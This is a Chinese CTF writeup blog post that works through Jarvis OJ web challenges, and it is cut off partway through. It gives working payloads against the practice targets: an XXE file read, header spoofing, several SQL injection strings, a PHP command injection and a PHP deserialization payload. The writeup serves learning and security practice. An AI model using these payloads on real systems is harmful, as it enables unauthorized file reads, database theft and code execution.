<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>长方体固体介质搬运技术 | M0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#api%E8%B0%83%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">api调用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LOCALHOST"><span class="toc-number">2.</span> <span class="toc-text">LOCALHOST</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PORT51"><span class="toc-number">3.</span> <span class="toc-text">PORT51</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Login"><span class="toc-number">4.</span> <span class="toc-text">Login</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61dctf-admin"><span class="toc-number">5.</span> <span class="toc-text">[61dctf]admin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61dctf-babyphp"><span class="toc-number">6.</span> <span class="toc-text">[61dctf]babyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61dctf-inject"><span class="toc-number">7.</span> <span class="toc-text">[61dctf]inject</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61dctf-babyxss"><span class="toc-number">8.</span> <span class="toc-text">[61dctf]babyxss@</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61dctf-register"><span class="toc-number">9.</span> <span class="toc-text">[61dctf]register@</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">10.</span> <span class="toc-text">神盾局的秘密</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHPINFO"><span class="toc-number">11.</span> <span class="toc-text">PHPINFO</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">12.</span> <span class="toc-text">WEB?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RE"><span class="toc-number">13.</span> <span class="toc-text">RE?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IN-A-Mess"><span class="toc-number">14.</span> <span class="toc-text">IN A Mess</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C"><span class="toc-number">15.</span> <span class="toc-text">flag在管理员手里</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easy-Gallery"><span class="toc-number">16.</span> <span class="toc-text">Easy Gallery</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chopper"><span class="toc-number">17.</span> <span class="toc-text">Chopper</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.</span> <span class="toc-text">图片上传漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-Injection"><span class="toc-number">19.</span> <span class="toc-text">Simple Injection</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201228205809.JPG"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">55</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">53</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">M0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">说说</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">No title</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-01-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.5k</span><span class="post-meta__separator">|</span><span>Reading time: 22 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><a id="more"></a>Jarvis OJ CTF Writeup

<p><strong><em>比较好的一个平台,学到了很多,非常推荐.</em></strong></p>
<h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><ul>
<li>XXE</li>
</ul>
<p>提示是请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>可以利用里面XML注入,中的file</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span>  <span class="meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p>
<h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>localhost access only!!</p>
<ul>
<li>XFF伪造</li>
</ul>
<p>抓包</p>
<p>X-Forwarded-For:127.0.0.1</p>
<p>PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p>
<h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p>在vps上使用</p>
<p>sudo curl –local-port 51 <a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32770/">http://web.jarvisoj.com:32770/</a></p>
<p>得到flag</p>
<p>PCTF{M45t3r_oF_CuRl}</p>
<h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>抓包后在response中得到hint</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot;,true代表输出16位二进制数字</span><br></pre></td></tr></table></figure>

<p>要想存在注入,就必须使md5加密后的内容中存在单引号之类的</p>
<p>这里将代码拆开一点,注意单双引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;  select * from &#96;admin&#96; where password&#x3D;&#39; &quot; .md5($pass,true).&quot;    &#39;        &quot; </span><br></pre></td></tr></table></figure>

<p>在网上找到了这个字符串<strong>ffifdyop</strong>,</p>
<p>为什么ffifdyop就是答案，因为ffifdyop的md5的原始二进制字符串里面有‘or’6这一部分的字符</p>
<p>其中这两个单引号就与前面和后面的两个单引号进行闭合,成为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;6&#39;&#39;&quot;</span><br></pre></td></tr></table></figure>

<p> 在mysql里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。如果只有数字,就不需要单引号闭合</p>
<p>参考链接 <a target="_blank" rel="noopener" href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p>
<p>PCTF{R4w_md5_is_d4ng3rous}</p>
<h1 id="61dctf-admin"><a href="#61dctf-admin" class="headerlink" title="[61dctf]admin"></a>[61dctf]admin</h1><ul>
<li>robots.txt(通过这道题,学到这一点.<strong>robots.txt也可能是做一道题的切入点</strong>)</li>
<li>抓包改参数0,1</li>
</ul>
<p><img src="https://i.loli.net/2020/01/03/MZ4J56YFby8Xsqk.png"></p>
<h1 id="61dctf-babyphp"><a href="#61dctf-babyphp" class="headerlink" title="[61dctf]babyphp"></a>[61dctf]babyphp</h1><ul>
<li>GIT源码泄露</li>
<li>命令执行</li>
<li>PHP语句的闭合</li>
</ul>
<p><img src="https://i.loli.net/2020/01/03/7feMgnP2BsXtZrk.png"></p>
<p>url/.git 无果,使用dirsearch扫一下</p>
<p><img src="https://i.loli.net/2020/01/03/vezRdglXGAmOsSf.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;templates/&quot;</span> . $page . <span class="string">&quot;.php&quot;</span>;<span class="comment">//这里将传递的page参数值拼接进入file</span></span><br><span class="line"><span class="comment">//$file = &quot;templates/&quot; . &#x27;.system(&quot;cd ../../../; ls -lA;&quot;).&#x27; . &quot;.php&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;$file&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//file_exists(&#x27;&quot;templates/&quot; . &#x27;.system(&quot;cd ../../../; ls -lA;&quot;).&#x27; . &quot;.php&quot;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/03/Gsbae6ARcjLltix.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?page&#x3D;flag&#39;.system(&quot;cat templates&#x2F;flag.php;&quot;).&#39;</span><br></pre></td></tr></table></figure>

<p>然后右键查看源码得到flag</p>
<h1 id="61dctf-inject"><a href="#61dctf-inject" class="headerlink" title="[61dctf]inject"></a>[61dctf]inject</h1><ul>
<li>Mysql中的反引号与单引号的区别</li>
<li>反引号注入</li>
</ul>
<p>用dirsearch扫描一下目录,发现一个index.php~</p>
<p>访问这个目录,页面上什么都没有,右键查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">$table = $_GET[<span class="string">&#x27;table&#x27;</span>]?$_GET[<span class="string">&#x27;table&#x27;</span>]:<span class="string">&quot;test&quot;</span>;<span class="comment">//三目运算符,如果条件为真,则执行?:中间的代码,否则执行:后面的代码</span></span><br><span class="line">$table = Filter($table);<span class="comment">//用户自定义的过滤器</span></span><br><span class="line">mysqli_query($mysqli,<span class="string">&quot;desc `secret_&#123;$table&#125;`&quot;</span>) <span class="keyword">or</span> Hacker();<span class="comment">//desc降序排列</span></span><br><span class="line">$sql = <span class="string">&quot;select &#x27;flag&#123;xxx&#125;&#x27; from secret_&#123;$table&#125;&quot;</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>反引号`在mysql中是为了区分保留字符与普通字符而引入的符号</p>
<blockquote>
<p>本题利用原理: </p>
<p>如果desc 后接的表不存在，则返回失败</p>
<p>注入点为参数table</p>
</blockquote>
<p><strong>当table=test时，由于库中存在secret_test表，因此mysqli_query()函数返回成功，继续向下执行，从而输出了flag{xxx}</strong><br> <strong>当table=123时，因为库中不存在secre_123表，因此跳转hacker()函数结束程序</strong></p>
<p>查询数据库,注意要使用limit 1,1 来进行限制输出,ret[0];只输出第一个</p>
<p>查到数据库为61d300</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table&#x3D;test&#96; &#96;union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 1,1 #取第二条记录</span><br></pre></td></tr></table></figure>

<p>表为secret_flag,secret_test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table&#x3D;test&#96; &#96;union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7365637265745f666c6167 limit 1,1 &#x2F;&#x2F;这里就要采用16进制绕过了</span><br></pre></td></tr></table></figure>

<p>字段flagUwillNeverKnow</p>
<p>得到具体的flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table&#x3D;test&#96; &#96;union select flagUwillNeverKnow from secret_flag limit 1,1</span><br></pre></td></tr></table></figure>

<p>flag{luckyGame~}</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42939527/article/details/100129254">参考文章</a></p>
<p>总结:</p>
<p>SQLi的类型确实很多,今天又见识到了一只反引号注入!</p>
<h1 id="61dctf-babyxss"><a href="#61dctf-babyxss" class="headerlink" title="[61dctf]babyxss@"></a>[61dctf]babyxss@</h1><ul>
<li>CSP内容安全策略绕过 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">CSP学习参考文章</a></li>
</ul>
<p>使用脚本爆破验证码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    text = random.sample(string,<span class="number">4</span>)</span><br><span class="line">    code = <span class="string">&quot;&quot;</span></span><br><span class="line">    text = code.join(text)</span><br><span class="line">    code = hashlib.md5(text).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> code[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">&#x27;111b&#x27;</span>:  <span class="comment">#这里填写你的字符</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;--------------------------&quot;</span></span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">print</span> code</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> code</span><br></pre></td></tr></table></figure>

<p>然后进行抓包分析,可以看到CSP的内容只能加载本域的脚本文件内容</p>
<p><img src="https://i.loli.net/2020/01/03/4pw8rmIiGvXJM6k.png"></p>
<p>这道题有点难,还是等我把XSS深度学习了再来做</p>
<h1 id="61dctf-register"><a href="#61dctf-register" class="headerlink" title="[61dctf]register@"></a>[61dctf]register@</h1><ul>
<li>二次注入 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/167089.html">二次注入学习参考文章</a></li>
</ul>
<p>…..</p>
<p>我是菜狗</p>
<h1 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h1><ul>
<li>文件读取</li>
<li>反序列化</li>
<li>链构造攻击(*其实也不算)</li>
</ul>
<p>查看图片,图片名是base64编码的.读取index.php 得到readfile();&gt;说明这里应该是文件读取的功能,因为不知道有哪些文件可以读,然后有现存一个showimg.php那就读取这个文件,得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos($f,<span class="string">&#x27;\\&#x27;</span>)===<span class="literal">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">&#x27;pctf&#x27;</span>)===<span class="literal">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);<span class="comment">//判断$f中是否存在.. /  \\ pctf,不存在就读取想要读取的文件名,如果存在就  echo &quot;File not found&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后读取index.php 然后我在firefox上代码显示不全,于是想到抓包,果然</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; $g = $_GET[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里把shield.php序列化得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">10</span>:<span class="string">&quot;shield.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>继续利用上面的漏洞.读取shield.php的源码,我这里用firefox仍然在网页上看不全源码,使用抓包看到源码,其实右键查看源码也可以-.-</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename = <span class="string">&#x27;&#x27;</span></span>)//赋值 </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里继续判断传入的文件名中是否存在 .. /  以及\ \</p>
<p>直接利用上面的代码,实例化对象的时候,为期赋值为pctf.php</p>
<p>得到payload为O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}</p>
<p>打进去右键查看源代码就得到flag</p>
<p><img src="https://i.loli.net/2020/01/03/GWJCcgUQd8mrR7N.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span><br></pre></td></tr></table></figure>

<h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><ul>
<li>session反序列化</li>
<li>任意代码执行</li>
</ul>
<p>关于这个点的学习,参考文章 <a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">参考</a></p>
<p>Session反序列化的原理: </p>
<blockquote>
<p>当php.ini文件中的“session.serialize_handler”设置，与在页面中的“session.serialize_handler”设置不一样时，就会可能有反序列化漏洞。</p>
<p>由phpinfo()页面知，session.upload_progress.enabled为On。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name<strong>同名</strong>变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session.</p>
<p><img src="https://i.loli.net/2020/01/03/GdJifUreICkzO5B.png"></p>
</blockquote>
<p>题目给出了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;<span class="comment">//为成员属性mdzz赋初值为phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);<span class="comment">//反序列化结束的时候利用eval执行其中的代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))<span class="comment">//设置GET的变量名为phpnifo</span></span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();<span class="comment">//如果确认设置了phpinfo,那么就实例化这个类,并赋值给m</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问index.php?phpinfo 得到phpinfo的界面,搜索disable_functions</p>
<p>禁用的系统函数有: 因此想利用命令执行是走不通的</p>
<table>
<thead>
<tr>
<th align="left">dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,chmod,set_time_limit,chroot,error_log,pfsockopen,syslog,symlink,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority等</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
</tr>
</tbody></table>
